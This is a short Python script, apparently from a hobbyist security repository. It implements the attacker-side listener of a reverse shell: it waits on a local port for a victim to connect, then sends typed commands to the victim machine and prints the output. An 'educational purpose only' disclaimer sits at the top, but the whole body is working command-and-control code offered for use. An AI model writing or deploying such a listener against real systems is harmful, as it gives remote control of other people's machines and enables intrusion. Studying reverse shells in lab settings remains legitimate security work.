################################################################################
##                                                                            ##
##                 This is a ReverseShell script                              ##
##             Author: MAhmutAY   <mahmutayy@yahoo.com>                       ##
##                                                                            ##
##                                                                            ##
##              This is only educational purpose usage                        ##
##  !!  Do not attempt to violate the laws with anything contained here. !!!  ##
################################################################################

import socket

HOST = '127.0.0.1'
PORT = 8081

def Attacker_server():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((HOST, PORT))
    s.listen(1)
    print(f"Server listening on {HOST}:{PORT}")
    
    conn, addr = s.accept()
    print(f"Connected by {addr}")

    while True:
        command = input("Shell> ")
        if command.lower() == 'exit':
            conn.send(command.encode())
            break
        conn.send(command.encode())
        response = conn.recv(4096).decode()
        print(response)
    
    conn.close()

if __name__ == "__main__":
    Attacker_server()
